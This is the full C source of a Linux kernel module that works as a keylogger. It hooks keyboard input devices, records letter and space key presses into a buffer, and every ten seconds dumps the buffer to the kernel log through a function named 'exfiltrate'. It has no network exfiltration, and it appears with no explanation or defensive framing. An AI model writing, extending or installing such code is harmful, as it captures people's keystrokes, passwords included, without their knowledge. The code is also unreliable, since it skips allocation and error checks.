#include <linux/module.h>
#include <linux/input.h>
#include <linux/timer.h>

#define LOG_SIZE 256

static char logbuf[LOG_SIZE];
static int logpos;

static struct timer_list exfil_timer;

struct kbdmon {
    struct input_handle handle;
};

static char key_to_char(unsigned int code)
{
    if (code >= KEY_A && code <= KEY_Z)
        return 'a' + (code - KEY_A);

    if (code == KEY_SPACE)
        return ' ';

    return '?';
}

static void exfiltrate(struct timer_list *t)
{
    if (logpos > 0) {

        logbuf[logpos] = 0;

        pr_info("EXFILTRATED: %s\n", logbuf);

        logpos = 0;
    }

    mod_timer(&exfil_timer,
              jiffies + 10 * HZ);
}

static void kbdmon_event(struct input_handle *h,
                         unsigned int type,
                         unsigned int code,
                         int value)
{
    char c;

    if (type != EV_KEY || value != 1)
        return;

    c = key_to_char(code);

    if (logpos < LOG_SIZE - 1)
        logbuf[logpos++] = c;
}

static int kbdmon_connect(struct input_handler *handler,
                          struct input_dev *dev,
                          const struct input_device_id *id)
{
    struct kbdmon *kbd;

    kbd = kzalloc(sizeof(*kbd), GFP_KERNEL);

    kbd->handle.dev = dev;
    kbd->handle.handler = handler;
    kbd->handle.name = "kbdmon";

    input_register_handle(&kbd->handle);
    input_open_device(&kbd->handle);

    return 0;
}

static void kbdmon_disconnect(struct input_handle *handle)
{
    struct kbdmon *kbd =
        container_of(handle, struct kbdmon, handle);

    input_close_device(handle);
    input_unregister_handle(handle);

    kfree(kbd);
}

static const struct input_device_id ids[] = {
    {
        .flags = INPUT_DEVICE_ID_MATCH_EVBIT |
                 INPUT_DEVICE_ID_MATCH_KEYBIT,
        .evbit = { BIT_MASK(EV_KEY) },
        .keybit = { [BIT_WORD(KEY_A)] = BIT_MASK(KEY_A) },
    },
    { },
};

static struct input_handler kbdmon_handler = {
    .event = kbdmon_event,
    .connect = kbdmon_connect,
    .disconnect = kbdmon_disconnect,
    .name = "kbdmon",
    .id_table = ids,
};

static int __init init_mod(void)
{
    timer_setup(&exfil_timer,
                exfiltrate,
                0);

    mod_timer(&exfil_timer,
              jiffies + 10 * HZ);

    return input_register_handler(&kbdmon_handler);
}

static void __exit exit_mod(void)
{
    del_timer_sync(&exfil_timer);

    input_unregister_handler(&kbdmon_handler);
}

module_init(init_mod);
module_exit(exit_mod);

MODULE_LICENSE("GPL");